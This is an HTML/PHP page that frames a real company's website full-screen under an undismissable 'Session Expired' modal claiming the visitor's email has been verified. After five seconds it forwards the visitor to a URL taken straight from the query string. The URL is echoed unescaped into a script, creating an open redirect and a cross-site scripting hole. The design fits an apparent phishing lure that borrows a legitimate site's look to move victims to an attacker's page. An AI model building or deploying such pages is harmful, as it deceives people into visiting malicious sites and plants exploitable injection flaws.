<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
</head>
<body >

<iframe src="https://www.parekhplast.com" style="z-index:1000;position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden;" id="i_frame"></iframe>


<div class="modal fade" id="exampleModal" style="z-index:3000;" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Session Expired</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
          <div align=center>
         <font color=Green size=2>Congratulations your email has been verified</font>
     </div>
      </div>
      <div class="modal-footer">
          <div align=center>
        <!--<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>-->
        <!--<button type="button" class="btn btn-primary">Verify</button>-->
        </body>
        </div>
      </div>
    </div>
  </div>
</div>

<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>


<!--<script type="text/javascript">-->
<!--    $(window).on('load', function(){-->
<!--        $('#myModal').modal('show');-->
<!--    });-->
<!--</script>-->

<script>

$( document ).ready(function() {

  $('#exampleModal').modal('show');
   var url = '<?php echo $_GET['url'];?>';
    window.setTimeout(function() {
    window.location.href = url;
}, 5000);
  $('#exampleModal').on('hide.bs.modal', function() {
      return false;
  })

});
</script>

<script>
function checkIframeLoaded() {
    // Get a handle to the iframe element
    var iframe = document.getElementById('i_frame');
    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;

    // Check if loading is complete
    if (  iframeDoc.readyState  == 'complete' ) {
        //iframe.contentWindow.alert("Hello");
        iframe.contentWindow.onload = function(){
            alert("I am loaded");
        };
        // The loading is complete, call the function we want executed once the iframe is loaded
        afterLoading();
        return;
    } 

    // If we are here, it is not loaded. Set things up so we check   the status again in 100 milliseconds
    window.setTimeout(checkIframeLoaded, 100);
}

function afterLoading(){
    alert("I am here");
     $('#exampleModal').modal('show');
 
   $('#exampleModal').on('hide.bs.modal', function() {
       return false;
   })
//   setTimeout(function{ window.location="https://google.com";}, 5000);
}
</script>
// </body>
</html>